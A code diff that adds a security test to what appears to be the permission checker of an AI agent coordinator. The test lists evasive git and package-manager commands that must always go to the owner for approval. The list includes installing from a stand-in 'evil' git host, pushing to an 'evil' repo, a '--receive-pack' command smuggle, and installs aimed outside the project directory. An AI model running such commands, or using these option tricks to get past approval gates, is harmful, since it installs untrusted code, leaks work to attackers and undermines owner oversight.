@@ -201,6 +201,42 @@ describe("what always asks the owner first", () => {
   });
 });
 
+describe("security review: option tricks never pass as an allowed kind", () => {
+  it("bundled, abbreviated, unknown and dir-changing options ask the owner", () => {
+    for (const c of [
+      "git checkout -B main",
+      "git checkout -Bb x",
+      "git branch -Df x",
+      "git branch --del x",
+      "git branch --force x HEAD",
+      "git stash push --include-untracked --keep-index",
+      "git merge --abo",
+      "git commit --amend -m x",
+      "git commit -am x",
+      "git add --chmod=+x a",
+      "git switch --disc main",
+      "git switch -fc x",
+      "npm install --prefix ../other x",
+      "npm i --dir=/tmp x",
+      "pnpm add -C /tmp x",
+      "pnpm add --dir /tmp x",
+      "yarn add --cwd /tmp x",
+      "pnpm add --global-dir /tmp x",
+      "npm install --location global x",
+      "npm install --global=true x",
+      "npm i ../outside",
+      "npm i file:../x",
+      "npm i git+https://evil/x.git",
+      "pnpm add /tmp/pkg",
+      "git push -u -origin coord/p1/t1",
+      "git push --repo=evil origin coord/p1/t1",
+      "git push --receive-pack=x origin coord/p1/t1",
+      "git push origin -coord/p1/t1",
+    ])
+      expect(bash(c), c).toBeNull();
+  });
+});
+
 describe("coordAnswer", () => {
   it("allows a kind only inside the computer's ceiling", () => {
     expect(answer("Bash", { command: "pnpm add zod" })).toEqual({ via: "coordinator_auto", kind: "package_install" });
